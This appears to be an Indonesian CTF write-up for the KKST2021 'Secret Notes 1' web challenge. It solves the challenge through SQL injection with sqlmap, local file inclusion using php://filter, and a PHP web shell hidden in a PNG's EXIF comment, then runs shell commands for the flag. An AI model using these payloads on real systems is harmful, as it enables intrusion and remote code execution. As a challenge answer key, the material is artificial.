# Secret Notes 1
Percayakan rahasiamu pada kami, kami akan menjaganya sepenuh hati seperti n---skip---<br/>

http://103.171.85.90:8082<br/>

Password VM : **4d1b54eeaceb5277ea022f7b42b53113**

##  Penjelasan
Cari vulnerability dalam web tersebut.

## How to Solve
1. Setelah beberapa lama mencari endpoint yang vulnerable, saya menemukan bahwa halaman edit secret ***/page.php?f=editsecret&id=your-id*** vuln terhadap sql injection.<br/>
2. Test sql injection dengan menambahkan ' (quote) pada judul. Didapatkan error sebagai berikut :
```
UPDATE `secret` SET `judul` = 'a'', `secret` = 'a' WHERE `id` = '1431944397'You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'a' WHERE `id` = '1431944397'' at line 1
```
3. Gunakan tools sqlmap untuk mempercepat proses dump database.<br/>
command :<br/>
``sqlmap -r exploit.txt --dump``<br/><br/>
dengan isi file exploit.txt sebagai berikut :<br/><br/>
```

POST /page.php?f=editsecret&id=<your-id> HTTP/1.1
Host: 103.171.85.90:8082
User-Agent: <user-agent>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: http://103.171.85.90:8082
Connection: close
Referer: http://103.171.85.90:8082/page.php?f=editsecret&id=2145985763
Cookie: PHPSESSID=<php-session-id>
Upgrade-Insecure-Requests: 1

judul=test*&secret=test
```

didapatkan user dengan username **first-flag-is** dan password **KKST2021{do_you_k**

4. Saya lanjut mencari endpoint yang dapat di exploit lagi dan ditemukan bahwa parameter **editsecret** pada ***page.php?f=editsecret&id=your-id*** vuln terhadap **Local File Inclusion**
5. Check error dengan mengganti **editsecret** dengan value lain yang invalid.
**/page.php?f=randomstring**
didapatkan error sebagai berikut :<br/><br/>
```
**Warning**: include(randomstring.php): failed to open stream: No such file or directory in **/var/www/html/page.php** on line **15**  
  
**Warning**: include(): Failed opening 'randomstring.php' for inclusion (include_path='.:/usr/local/lib/php') in **/var/www/html/page.php** on line **15**
```
Dari error tersebut, saya mengira seperti inilah yang ada pada file page.php<br/>
```
<?php
	include($_GET["f"].".php");
	...
?>
```
6. Gunakan **php://filter/convert.base64-encode/resource=** untuk membaca file.<br/>
``http://103.171.85.90:8082/page.php?f=php://filter/convert.base64-encode/resource=page``
didapatkan isi dari **page.php** dalam base64 encoding.<br/>
```
PD9waHAgaW5jbHVkZSgnaGVhZGVyLnBocCcpOyA/PgoKCjw/cGhwCgogICAgaWYoaXNzZXQoJF9HRVRbJ2YnXSkpewoKCgogICAgICAgICRmaWxlcyA9ICRfR0VUWydmJ10uIi5waHAiOwoKICAgICAgICBpZihwcmVnX21hdGNoKCcvXC5wbmcvbScsICRfR0VUWydmJ10pKXsKICAgICAgICAgICAgaW5jbHVkZSAkX0dFVFsnZiddOwogICAgICAgIH1lbHNlewogICAgICAgICAgICBpbmNsdWRlICRmaWxlczsKICAgICAgICB9CgogICAgICAgIAoKICAgIH0KCj8+CgoKPD9waHAgaW5jbHVkZSgnZm9vdGVyLnBocCcpOyA/Pg==
```
Setelah di decoding, didapatkan isi dari file **page.php**<br/><br/>
```<?php include('header.php'); ?>
<?php

    if(isset($_GET['f'])){



        $files = $_GET['f'].".php";

        if(preg_match('/\.png/m', $_GET['f'])){
            include $_GET['f'];
        }else{
            include $files;
        }



    }

?>


<?php include('footer.php'); ?>
```
Setelah membaca file tersebut, ada sesuatu yang menarik yaitu, saya dapat memanggil file **png** dan di halaman **upload.php** terdapat form upload file untuk mengunggah gambar. Saya berpikiran untuk mengupload backdoor dengan file png yang disisipkan kode php, sehingga ketika nanti file png tersebut dipanggil, maka kode php tersebut berjalan.

7. Gunakan **exiftool** untuk menambahkan kode php ke dalam file png.
	command :<br/>
	 ``exiftool -Comment='<?=`$_GET[0]`?>' file.png``
8. Upload file tersebut pada halaman **upload.php**, otomatis file tersebut akan ter-rename dengan format **file/\<nama-user\>.png** dalam kasus saya adalah **file/user.png**
9. Panggil file png yang sudah diupload tadi.
``http://103.171.85.90:8082/page.php?f=file/user.png``  
10. Setelah memanggil file png tadi, sekarang saya dapat melakukan command shell. 
``http://103.171.85.90:8082/page.php?f=file/user.png&0=<your-command>``
11. Gunakan command **ls -lah** untuk melihat directory, sehingga ditemukan folder **.Administrator** yang berisikan file index.php
12. Gunakan command **cat** untuk membaca file tersebut.
``http://103.171.85.90:8082/page.php?f=file/user.png&0=cat .Administrator/index.php``
13. view-page source dan didapatkan flag bagian kedua :<br/>
```
<?php 
  $another_flag = "now_another_cooking?_twiceeee!!!}";
?>
```

## Flag
KKST2021{do_you_know_another_cooking?_twiceeee!!!}
